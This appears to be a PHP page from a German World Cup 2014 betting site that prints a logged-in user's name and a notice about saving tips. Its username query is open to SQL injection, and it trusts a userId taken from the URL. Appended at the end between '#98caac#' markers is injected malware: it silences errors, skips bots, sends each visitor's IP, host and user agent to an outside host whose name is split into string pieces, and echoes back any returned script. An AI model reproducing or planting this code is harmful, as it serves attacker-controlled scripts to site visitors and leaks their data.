<?php
// we must never forget to start the session
session_start();

$userId=$_GET["userId"];
if(strlen($userId)==0)
{
	header("Location: ../util/login.php5");
	exit;
}
include_once("../../connection/dbaccess-local.php5");
include_once("../util/dbutil.php5");
$userName=$dbutil->getUserName($userId);
?>
<html>
<head>
<link rel="stylesheet" type="text/css" href="../../style/style-WM2014.css" />
<title>WM-Tipp</title>
</head>
<body>


<?php
printUserInfo($userName);
function printUserInfo($userName){
	$tableusers=dbschema::users;
	$sql="SELECT * from $tableusers WHERE username='$userName'";
	$resultUser=mysql_query($sql);
	$array=mysql_fetch_array($resultUser);
	$firstname=$array["firstname"];
	$lastname=$array["lastname"];
	echo "Benutzer <h2>$firstname $lastname</h2>";
	echo "<br>";
	echo "<br>";
	//echo "<p class=\"info\"><font color=\"red\"><u>Hinweis</u>: Die Spielergebnistipps müssen alle <i><u><b>einzeln</b></u></i> abgespeichert werden!</font></p>";
	echo "<p class=\"info\">Hinweis: Die Paarungen und Ergebnisse in der <u><b>Endrunde</b></u> (ab dem Achtelfinale) müssen alle <i><u><b>einzeln</b></u></i> abgespeichert werden!</p>";
	echo "<br>";
}
?>
<?php
#98caac#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/98caac#
?>